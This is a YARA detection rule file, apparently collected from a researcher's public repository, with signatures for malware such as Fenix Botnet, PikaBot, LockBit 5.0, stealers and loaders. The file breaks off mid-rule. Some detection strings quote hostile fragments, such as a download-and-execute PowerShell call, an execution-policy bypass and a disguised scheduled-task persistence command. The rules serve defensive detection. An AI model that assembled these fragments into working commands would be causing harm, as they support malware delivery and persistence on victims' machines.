import "dotnet"
import "hash"
import "pe"

rule RUSSIANPANDA_Mal_Botnetfenix_Payload : FILE
{
	meta:
		description = "Detects BotnetFenix payload"
		author = "RussianPanda"
		id = "566bfae1-c43d-5bd6-adcf-faff32d8c325"
		date = "2024-02-02"
		modified = "2024-02-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/FenixBotnet/mal_BotnetFenix_Payload.yar#L1-L16"
		license_url = "N/A"
		hash = "65a9575c50a96d04a3f649fe0f6b8ccd"
		logic_hash = "27f423b509ad8de0f8389c7b3e3bfec2eeb10c964aa8c70bad47cc4334df1a5e"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "tasks_register"
		$s2 = "actionget_action"
		$s3 = "Post Success"
		$s4 = "Success Stealer"
		$s5 = "Download and Execute task id"
		$a = "_CorExeMain"

	condition:
		uint16( 0 ) == 0x5A4D and 4 of ( $s* ) and $a
}
rule RUSSIANPANDA_Mal_Fenixbotnet_Jse
{
	meta:
		description = "Detects Fenix Botnet JSE downloader"
		author = "RussianPanda"
		id = "00c6f8a6-c2e2-5b08-b332-b91371060bbe"
		date = "2024-01-18"
		modified = "2024-02-02"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/FenixBotnet/mal_FenixBotnet_jse.yar#L1-L14"
		license_url = "N/A"
		hash = "a7fadf0050d4d0b2cefd808e16dfde69"
		logic_hash = "848c00361fba60e63e8ec4098404e87d4ba2b11d8489ad16d49c20fc653a5e45"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = {76 61 72 20 [0-30] 3D 20 22 66 22}
		$s2 = {76 61 72 20 [0-30] 3D 20 22 75 22}
		$s3 = {76 61 72 20 [0-30] 3D 20 22 6E 22}
		$s4 = {6E 65 77 20 46 75 6E 63 74 69 6F 6E 28 64 65 63 6F 64 65 55 52 49 43 6F 6D 70 6F 6E 65 6E 74 28 [0-30] 29 29 2E 63 61 6C 6C 28 29}

	condition:
		all of ( $s* )
}
rule RUSSIANPANDA_Cowtunnel : FILE
{
	meta:
		description = "Detects CowTunnel"
		author = "RussianPanda"
		id = "dc9f8416-0f5b-51d8-ad13-46ebe40af13a"
		date = "2025-12-08"
		modified = "2025-12-08"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/CowTunnel/linux_mal_CowTunnel.yar#L1-L13"
		license_url = "N/A"
		hash = "776850a1e6d6915e9bf35aa83554616129acd94e3a3f6673bd6ddaec530f4273"
		logic_hash = "80c96d02e216331ec0b711ae1a1ee5fcf31df8847009afe23735abc3f8bd8ec9"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "cannot create proxy service, it should not happenned!"
		$s2 = "[nss] encrypt_data"
		$s3 = "[nss] decrypt_data"

	condition:
		uint32( 0 ) == 0x464c457f and all of them
}
rule RUSSIANPANDA_Textshell : FILE
{
	meta:
		description = "Detects TextShell Obfsucator"
		author = "RussianPanda"
		id = "48fe49be-a76e-5e6c-a69f-acbe73f4d175"
		date = "2025-10-31"
		modified = "2025-11-02"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/VanillaTempest/win_mal_TextShell.yar#L1-L13"
		license_url = "N/A"
		hash = "cf44aa11a17b3dad61cae715f4ea27c0cbf80732a1a7a1c530a5c9d3d183482a"
		logic_hash = "c8f84d7160d8cb3b76d06170af09c921893b6f4cd073a10b399d8f51199cef40"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {41 8B 04 84 48 03 ?? EB}
		$s2 = {41 3B ?? 74 ?? FF C3 3B 5D 18 72}
		$s3 = {FF 15 ?? ?? ?? ?? 48 8B}

	condition:
		uint16( 0 ) == 0x5A4D and all of them and #s3 > 1000
}
rule RUSSIANPANDA_Supperbackdoor
{
	meta:
		description = "Detects Supper backdoor"
		author = "RussianPanda"
		id = "fb0cf8a1-e8a2-5b9e-a1ee-c1865abdb49b"
		date = "2026-04-14"
		modified = "2026-04-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/VanillaTempest/win_mal_SupperBackdoor.yar#L1-L14"
		license_url = "N/A"
		hash = "bf2ba1f30ef8ca6f9946f6ec21118eff3c3442590bbedea150e2d670e78ab986"
		logic_hash = "0cc81c52bb6889d0d6e407a22de85b45213b0be5826bfb4b0cb23d2ef7ea36a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "schtasks.exe /Create /SC MINUTE /TN GoogleUpdateTask"
		$s2 = "serv disconnect"
		$s3 = "fail run cmd"
		$s4 = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000"

	condition:
		3 of them
}
rule RUSSIANPANDA_Johnwalkertexasloader : FILE
{
	meta:
		description = "Detects JohnWalkerTexasLoader (JWTL)"
		author = "RussianPanda"
		id = "af91ab47-245b-58f2-a35a-1cb408b2229a"
		date = "2024-10-10"
		modified = "2024-10-10"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/JWTL/JohnWalkerTexasLoader.yar#L1-L16"
		license_url = "N/A"
		hash = "3784fc39dc5c0dec08ad0a49bbbb990359e313a9fa87e6842fd67ed7cc1c0baa"
		logic_hash = "414be3219d12823639d140d132a9bbc2ca7bf8c44d0c560e4a49b76323be3f8a"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "?status=1&wallets=" ascii wide
		$s2 = "/api.php" ascii wide
		$s3 = "/api-debug.php" ascii wide

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Johnwalkertexasloader_V2 : FILE
{
	meta:
		description = "Detects JohnWalkerTexasLoader (JWTL)"
		author = "RussianPanda"
		id = "1a05245e-5ee0-5916-801b-4f7f3a573e71"
		date = "2024-10-15"
		modified = "2024-10-15"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/JWTL/JohnWalkerTexasLoader_v2.yar#L1-L16"
		license_url = "N/A"
		hash = "9f6bf0473f5541d84faad4c33a0bc5b1928fceb5938f2d6a7e6e02b7f0980341"
		logic_hash = "70cbf6cf0602dc8087f4845451d13d0043872733615050161c077e3346387873"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$s1 = {61 00 48 00 52 00 30 00 63 00 48 00 4D 00 36 00 4C 00 79 00 39}
		$s2 = {73 65 6E 64 6F 70 65 6E 31}
		$s3 = {73 65 6E 64 6F 70 65 6E 32}

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Pikabot : FILE
{
	meta:
		description = "Detects PikaBot"
		author = "RussianPanda"
		id = "e740b821-69cc-5053-9f90-439b4364656f"
		date = "2024-01-02"
		modified = "2024-01-02"
		reference = "https://research.openanalysis.net/pikabot/debugging/string%20decryption/2023/11/12/new-pikabot.html"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/PikaBot/Pikabot_1-2-2024.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "f2dd26c23aba72c2b6b959fb411381b7d3a7466f94bf5259f57e96e44d3ee153"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {8A 04 11 30 02 42 83 EE 01 75 F5 5E C3}
		$s2 = {C0 E9 02 C0 E0 04 [13] C0 E2 06 02 D0}
		$s3 = {8D 53 BF 80 FA 19 0F B6 C3}

	condition:
		uint16( 0 ) == 0x5A4D and 2 of ( $s* ) and filesize < 500KB
}
rule RUSSIANPANDA_Gatekeeperpayload : FILE
{
	meta:
		description = "Detects GateKeeper payload used by KongTuke"
		author = "RussianPanda"
		id = "5043d9fa-3b11-50bd-a8d2-56aa6e449d9e"
		date = "2026-01-16"
		modified = "2026-01-16"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/KongTuke/gatekeeper_payload.yar#L1-L15"
		license_url = "N/A"
		hash = "f1f3cf076f8a6f3f5bac6a2a05d4883cc02919fbaf88a6826c86761a1d49f6e1"
		logic_hash = "4e31df0feec4bc744344953ab27eae6a4db7ad073812c0f3152a8e27dd2253fc"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {68 00 00 00 79 00 00 00 70 00 00 00 65 00 00 00 72 00 00 00 64 00 00 00 62 00 00 00 67 00 00 00}
		$s2 = {64 00 00 00 6E 00 00 00 73 00 00 00 70 00 00 00 79 00 00 00}
		$s3 = "GetProcesses" ascii wide
		$s4 = "MainWindowTitle" ascii wide
		$s5 = "mscoree.dll"

	condition:
		all of ( $s* ) and filesize < 5MB
}
rule RUSSIANPANDA_Modelorat
{
	meta:
		description = "Detects ModeloRAT Python RAT used by KongTuke"
		author = "RussianPanda"
		id = "a9d9644f-c571-527f-b2d2-964c177161a2"
		date = "2026-01-16"
		modified = "2026-01-16"
		reference = "KongTuke CrashFix Campaign"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/KongTuke/ModeloRAT.yar#L1-L14"
		license_url = "N/A"
		hash = "c15f44d6abb3a2a882ffdc9b90f7bb5d1a233c0aa183eb765aa8bfba5832c8c6"
		logic_hash = "9c3f87463ad09f3d1ac36823b096d7b066ce51393086509c3dfd1bbd73210ebb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "UnnecessarilyProlongedCryptographicMechanismImplementationClass"
		$s2 = "_enumerate_executing_processes"
		$s3 = "_enumerate_network_connections"

	condition:
		all of them
}
rule RUSSIANPANDA_Mintsloader
{
	meta:
		description = "Detects MintsLoader scripts"
		author = "RussianPanda"
		id = "a72cbf50-d8b1-5e8d-abbe-2621ef231b41"
		date = "2026-01-16"
		modified = "2026-01-16"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/KongTuke/MintsLoader.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "a8aee7f25df6c401fdb1a0d5c8a4a3f466014e1fa53f43365e414a522b693356"
		score = 75
		quality = 81
		tags = ""

	strings:
		$s1 = "Get-Date).DayOfYear" ascii wide nocase
		$s2 = ".php?id=$" ascii wide nocase
		$s3 = ".top" ascii wide
		$s4 = "$global" ascii wide

	condition:
		3 of them
}
rule RUSSIANPANDA_Easycrypter : FILE
{
	meta:
		description = "Detects EasyCrypter"
		author = "RussianPanda"
		id = "73b01a6c-dcd1-502e-a431-daf82ab3ed50"
		date = "2024-01-05"
		modified = "2024-01-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/EasyCrypter/easycrypter.yar#L1-L16"
		license_url = "N/A"
		hash = "60063c99fda3b6c5c839ec1c310b03e8f9c7c8823f2eb7bf75e22c6d738ffa8f"
		logic_hash = "761ed4629150453009b76d9c2ad251754009b464550b92dab3395fa30422f6ef"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {F6 17 [16-20] 80 2F 36 [16-20] 80 07 87}
		$s2 = {81 38 50 45 00 00 [20-22] 8B 88 A0 00 00 00 [2-4] 8B 80 A4 00 00 00 [5-7] 8B 40 50 [50-56] 89 0C 24 89 44 24 04 C7 44 24 08 00 30 00 00 C7 44 24 0C 04 00 00 00 FF 15 [3] 00}

	condition:
		uint16( 0 ) == 0x5A4D and $s1 and $s2
}
rule RUSSIANPANDA_Win_Mal_Hwaudkiller : FILE
{
	meta:
		description = "Detects HwAudKiller BYOVD AV/EDR killer "
		author = "RussianPanda"
		id = "7821deac-96b9-54ff-b9cc-55d12c75fe33"
		date = "2025-03-16"
		modified = "2026-03-16"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/FatMalloc/HwAudKiller.yar#L1-L12"
		license_url = "N/A"
		hash = "28278b8c85c832417f9860fe8ea3ddbb9ff1d5860317db4813227a3a52b7c7cc"
		logic_hash = "645e4e362772e5c65c0afdbdef019b93ed66c174403eb0884c830ea55ee9aeb6"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "[+] Havoc Process Terminator"
		$s2 = "sc create Havoc"

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}
rule RUSSIANPANDA_Win_Mal_Fatmalloc : FILE
{
	meta:
		description = "Detects FatMalloc Crypter"
		author = "RussianPanda"
		id = "d4a44adc-2bda-5224-9c1f-8b9de5f03220"
		date = "2025-03-16"
		modified = "2026-03-16"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/FatMalloc/win_mal_fatmalloc.yar#L1-L13"
		license_url = "N/A"
		hash = "8a4033425d36cd99fe23e6faef9764fbf555f362ebdb5b72379342fbbe4c5531"
		logic_hash = "4cc15a2c3003012d017a3ae2db68fc2c288680d9bc5063f44abab9eaca380485"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {48 89 E8 48 8B 3C 24 48 8D 64 24 08 5E 5B 5D FF E0}
		$s2 = {88 E3 32 1C 0E 88 5C 15 00}
		$s3 = "timeSetEvent"

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}
rule RUSSIANPANDA_Zharkbot : FILE
{
	meta:
		description = "Detects ZharkBot"
		author = "RussianPanda"
		id = "54213d76-7e27-559d-b653-5390a0c6813c"
		date = "2024-01-21"
		modified = "2024-03-12"
		reference = "https://x.com/ViriBack/status/1749184882822029564?s=20"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ZharkBot/zharkbot.yar#L1-L15"
		license_url = "N/A"
		hash = "d53ce8c0a8a89c2e3eb080849da8b1c47eaac614248fc55d03706dd5b4e10bdd"
		logic_hash = "ffaec6b19dd4385cd1bc156fdfde39a356367c7fba4135c48a8de62a18a78576"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {F7 EA C1 FA 04 8B C2 C1 E8 1F 03 C2 8B 55 ?? 0F BE C0 8A CA 6B C0 ?? 2A C8 80 C1}
		$s2 = {F7 E2 C1 EA 04 0F BE C2 8B 55 ?? 8A CA 6B C0 ?? 2A C8 80 C1 ?? 30 8C 15}

	condition:
		uint16( 0 ) == 0x5A4D and #s1 > 3 and #s2 > 3 and filesize < 500KB
}
rule RUSSIANPANDA_Zharkbot_1 : FILE
{
	meta:
		description = "Detects ZharkBot, version 1.2.5"
		author = "RussianPanda"
		id = "e20875ed-a0a1-5ac8-8758-33766c522c17"
		date = "2024-09-02"
		modified = "2024-09-03"
		reference = "https://research.openanalysis.net/zharkbot/triage/x64dbg/2024/09/02/zharkbot-config.html"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ZharkBot/Zharkbot.yar#L1-L15"
		license_url = "N/A"
		hash = "1aa0622a744ec4d28a561bac60ec5e907476587efbadfde546d2b145be4b8109"
		logic_hash = "fded6a0c7af4fda13619778669ef619f88b43e12f12284a3c551c4fddac01024"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "^[a-z]{8}$"
		$s2 = "^d{6}$"

	condition:
		uint16( 0 ) == 0x5A4D and all of them and filesize < 500KB
}
rule RUSSIANPANDA_Obfuscation_Powershell_Special_Chars
{
	meta:
		description = "Detects PowerShell special character obfuscation"
		author = "RussianPanda"
		id = "dd2d41d4-3431-5252-adf1-d537f3b8db7e"
		date = "2024-01-12"
		modified = "2024-02-02"
		reference = "https://perl-users.jp/articles/advent-calendar/2010/sym/11"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/PowerShell Obfuscation/obfuscation_powershell_special_chars.yar#L1-L15"
		license_url = "N/A"
		hash = "d77efad78ef3afc5426432597ba129141952719846bc5ccd058249bb23d8a905"
		logic_hash = "4cc4ebffe7bf712b412a060536acc51d94381d24b46e5494195ae17482076cd6"
		score = 75
		quality = 81
		tags = ""

	strings:
		$s1 = {7d 3d 2b 2b 24 7b}
		$s2 = {24 28 20 20 29}
		$s3 = {24 7B [1-10] 7D 20 20 2B 20 20 24}
		$s4 = {24 7B [1-10] 7D 24 7B}

	condition:
		2 of ( $s* )
}
rule RUSSIANPANDA_Smartapesg_JS_Netsupportrat_Stage2 : FILE
{
	meta:
		description = "Detects SmartApeSG JavaScript Stage 2 retrieving NetSupportRAT"
		author = "RussianPanda"
		id = "2a614e11-be32-5bf1-9fd1-da224f0a644e"
		date = "2024-01-11"
		modified = "2024-01-12"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SmartApeSG/SmartApeSG_JS_NetSupportRAT_stage2.yar#L1-L23"
		license_url = "N/A"
		hash = "67d8f84b37732cf85e05b327ad6b6a9f"
		logic_hash = "5a2afaa14d513e0a3c4e52acfb433e53a4541983a05d15318a217c14dc06453c"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "powershell.exe -Ex Bypass -NoP -C $"
		$x2 = "Get-Random -Minimum -1000 -Maximum 1000"
		$s1 = "HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
		$s2 = "=new ActiveXObject('W"
		$s3 = "System.Net.WebClient).DownloadString($"
		$s4 = "FromBase64String"
		$s5 = "Start-Process -FilePath $"

	condition:
		filesize < 1MB and ( ( 1 of ( $x* ) and 3 of them ) or 5 of them )
}
rule RUSSIANPANDA_Smartapesg_JS_Dropper_Stage1 : FILE
{
	meta:
		description = "Detects SmartApeSG initial JavaScript file"
		author = "RussianPanda"
		id = "9513f323-c315-5ae2-92a5-c831d0a7ce2a"
		date = "2024-01-11"
		modified = "2024-01-11"
		reference = "https://medium.com/walmartglobaltech/smartapesg-4605157a5b80"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SmartApeSG/SmartApeSG_JS_dropper_stage1.yar#L1-L18"
		license_url = "N/A"
		hash = "8769d9ebcf14b24a657532cd96f9520f54aa0e799399d840285311dfebe3fb15"
		logic_hash = "de7e4ec30c780699b46de7baf2a916fdb7331da2ee7c2d637422ea664cd03b82"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "'GE'+'T'"
		$a2 = "'GE','T'"
		$s1 = "pt.Creat"
		$s2 = "L2.ServerX"
		$s3 = "ponseText"
		$s4 = "MLHTTP.6.0"
		$s5 = /\/news\.php\?([0-9]|[1-9][0-9]|100)/

	condition:
		all of ( $s* ) and filesize < 1MB and any of ( $a* )
}
rule RUSSIANPANDA_Win_Mal_Rustydropper : FILE
{
	meta:
		description = "Detects RustyDropper"
		author = "RussianPanda"
		id = "9f217080-81e0-547a-9336-cf8ac2fadf36"
		date = "2024-03-01"
		modified = "2024-03-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/RustyDropper/win_mal_RustyDropper.yar#L1-L12"
		license_url = "N/A"
		hash = "a3a5e7011335a2284e2d4f73fd464ff129f0c9276878a054c1932bc50608584b"
		logic_hash = "d0c76bcd1af63cc1b1fbabc3fa33e6caafd7d9c7c3780a94a1ed37eadef655d7"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$s1 = {47 3a 5c 52 55 53 54 5f 44 52 4f 50 50 45 52 5f 45 58 45 5f 50 41 59 4c 4f 41 44 5c 44 52 4f 50 50 45 52 5f 4d 41 49 4e 5c}
		$s2 = {46 45 41 54 55 52 45 5f 42 52 4f 57 53 45 52 5f 45 4d 55 4c 41 54 49 4f 4e}

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Neptune_Loader : FILE
{
	meta:
		description = "Detects Neptune Loader"
		author = "RussianPanda"
		id = "d576bf47-10bd-55d0-99b0-69c02dc87f17"
		date = "2024-01-17"
		modified = "2024-01-21"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/NeptuneLoader/neptune_loader.yar#L1-L18"
		license_url = "N/A"
		logic_hash = "ca54b8a624d48aa28bc727420f25e6f0fd67b193ac79443a357d88a9fe7cbdbb"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$s1 = {8B C6 E8 F4 FB FF FF}
		$s2 = {66 33 D1 66 89 54 58 FE}
		$s3 = {7C 53 74 61 72 74 75 70 46 6F 6C 64 65 72 7C}
		$s4 = {44 65 6C 70 68 69}
		$t1 = {C7 [3] 0B 40 40 00 [6] A1 ?? 61 40 00}
		$t2 = {C7 ?? 24 00 40 40 00 A1 ?? 61 40 00}
		$t3 = {8B ?? ?? FF D0 B8}

	condition:
		uint16( 0 ) == 0x5A4D and 3 of ( $s* ) or 2 of ( $t* ) and filesize < 6MB
}
rule RUSSIANPANDA_Win_Mal_Mpxdropper : FILE
{
	meta:
		description = "Detects MpxDropper"
		author = "RussianPanda"
		id = "26ee0a12-c727-5953-8ebb-dd8a8d772561"
		date = "2024-03-01"
		modified = "2024-03-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/MpxDropper/mal_win_MpxDropper.yar#L1-L11"
		license_url = "N/A"
		hash = "3a44a45afbfe5fc7cdeb3723e05c4e892b079abdb7d1e8d6fc70496ef0a14d5d"
		logic_hash = "e8d2672553c7f44e1cc177fad6596bd58b5c32a7541f91ce1207e6b21ef6e52d"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {43 3a 5c 55 73 65 72 73 5c 6d 70 78 31 36 5c 73 6f 75 72 63 65 5c 72 65 70 6f 73}

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Win_Ransom_Lockbit5 : FILE
{
	meta:
		description = "Detects LockBit 5.0"
		author = "RussianPanda"
		id = "bfe66503-fdd1-5a9a-9509-5b97efaabd9b"
		date = "2025-09-15"
		modified = "2025-09-15"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Ransomware/win_ransom_lockbit5.0.yar#L1-L15"
		license_url = "N/A"
		hash = "7ea5afbc166c4e23498aa9747be81ceaf8dad90b8daa07a6e4644dc7c2277b82"
		logic_hash = "579944626f576ce9771b0a7de40a5766221acd5db1ef4257a45314a99714067d"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {C6 41 0F 00 0F B6 ?? 33 ?? 89}
		$s2 = {0F B6 ?? 0F C1 ?? 18 31}
		$s3 = {83 ?? 02 83 ?? 0F D0 84 ?? ?? 00 00 00}

	condition:
		all of ( $s* ) and uint16( 0 ) == 0x5A4D and filesize < 1MB
}
rule RUSSIANPANDA_Win_Mal_Planetstealer : FILE
{
	meta:
		description = "Detects PlanetStealer"
		author = "RussianPanda"
		id = "f912066f-4151-5f83-8d34-6bffdf9e25e5"
		date = "2024-03-04"
		modified = "2024-03-24"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/PlanetStealer/win_mal_PlanetStealer.yar#L1-L14"
		license_url = "N/A"
		logic_hash = "e1660d6fed4c48b45b40bd51fb52254c5b19ca6f1938b68f2344bde473820b86"
		score = 75
		quality = 79
		tags = "FILE"

	strings:
		$s1 = {48 8D 15 ?? ?? ?? 00 0F B6 34 10 0F B6 BC 04 ?? ?? 00 00 ?? ?? 40 88 ?? 04 ?? ?? 00 00 48 FF C0}
		$s2 = {48 83 F8 ?? 7C DA}
		$s3 = {72 75 6E 74 69 6D 65 2E 67 6F 62 75 66}
		$s4 = {74 6F 74 61 6C 5F 77 61 6C 6C 65 74 73}
		$s5 = {74 6F 74 61 6C 5F 63 6F 6F 6B 69 65 73}

	condition:
		uint16( 0 ) == 0x5A4D and all of them and #s2 > 100 and #s1 > 100 and filesize < 20MB
}
rule RUSSIANPANDA_Prysmax_Stealer : FILE
{
	meta:
		description = "Detects Prysmax Stealer"
		author = "RussianPanda"
		id = "97ab92b8-1771-5881-9cd1-d8ff76b8f380"
		date = "2024-01-09"
		modified = "2024-01-10"
		reference = "https://www.cyfirma.com/outofband/new-maas-prysmax-launches-fully-undetectable-infostealer/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Prysmax Stealer/prysmax_stealer.yar#L1-L21"
		license_url = "N/A"
		logic_hash = "869eee7dd5209bdea98c248791b9ac911e3daabe6d440aa62aecefa43539a41c"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$a1 = {23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23}
		$s2 = {73 70 72 79 73 6D 61 78}
		$s3 = {56 43 52 55 4E 54 49 4D 45 31 34 30 2E 64 6C 6C}
		$s4 = {56 43 52 55 4E 54 49 4D 45 31 34 30 5F 31 2E 64 6C 6C}
		$s5 = {4D 53 56 43 50 31 34 30 2E 64 6C 6C}
		$s6 = {50 79 49 6E 73 74 61 6C 6C 65 72}

	condition:
		all of ( $s* ) and uint16( 0 ) == 0x5A4D and $a1 in ( 9600000 .. filesize ) and #a1 > 600 and filesize > 60MB and filesize < 200MB
}
rule RUSSIANPANDA_Beigeburrow : FILE
{
	meta:
		description = "Detects BeigeBurrow Reverse Tunnel Agent"
		author = "RussianPanda"
		id = "311711ca-4037-5ca8-bc44-9ac7243b00ea"
		date = "2026-04-17"
		modified = "2026-04-17"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/BeigeBurrow/win_mal_BeigeBurrow.yar#L1-L15"
		license_url = "N/A"
		hash = "a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c"
		logic_hash = "619380e108b83067da88662daa1841c65a95a820cc74335af0477452d3b02735"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "connection failed: %v, retrying in 5m"
		$s2 = "failed to dial %s: %v"
		$s3 = "failed to read target: %v"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Mal_Xred_Backdoor : FILE
{
	meta:
		description = "Detects XRed backdoor"
		author = "RussianPanda"
		id = "61f5fcb8-9351-5db0-8bce-123c96d2a443"
		date = "2024-02-09"
		modified = "2024-02-09"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/XRed_Backdoor/mal_xred_backdoor.yar#L1-L18"
		license_url = "N/A"
		hash = "9e1fbae3a659899dde8db18a32daa46a"
		logic_hash = "36d138a0efade1d5c075662dc528235fe66b49879730db78c4c7290fec7420b5"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = {4B 65 79 62 6F 61 72 64 20 48 6F 6F 6B 20 2D 3E 20 41 63 74 69 76 65}
		$s2 = {54 43 50 20 43 6C 69 65 6E 74 20 2D 3E 20 41 6B 74 69 66}
		$s3 = {55 53 42 20 48 6F 6F 6B 73 20 2D 3E 20 41 63 74 69 76 65}
		$s4 = {45 58 45 55 52 4C 31}
		$s5 = {49 4E 49 55 52 4C 33}
		$s6 = {58 52 65 64 35 37}

	condition:
		uint16( 0 ) == 0x5A4D and 3 of them
}
rule RUSSIANPANDA_Potemkinloader : FILE
{
	meta:
		description = "Detects Potemkin Loader"
		author = "RussianPanda"
		id = "02e058c1-a067-58c9-8a4b-967615283b34"
		date = "2026-06-04"
		modified = "2026-06-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ClickFix/potemkin_loader.yar#L1-L13"
		license_url = "N/A"
		hash = "2abe5dd3a057fdef935722e50e9251c272d29fd26113187b853a1f9a9cb89d9b"
		logic_hash = "1b6a299f02c7783b734dffd425a1fab03e2a07969f939bbdf4ac29f034081275"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "[Agent] DLL returned (updatedll), reloading..." ascii
		$s2 = "dll_debug.log" ascii
		$s3 = "[Agent] LoadAndRunDLL=" ascii

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}
rule RUSSIANPANDA_Rmmproject : FILE
{
	meta:
		description = "Detects RMMProject RAT"
		author = "RussianPanda"
		id = "2b24dbd1-e763-5bcd-9f8b-f11a1b21fd8b"
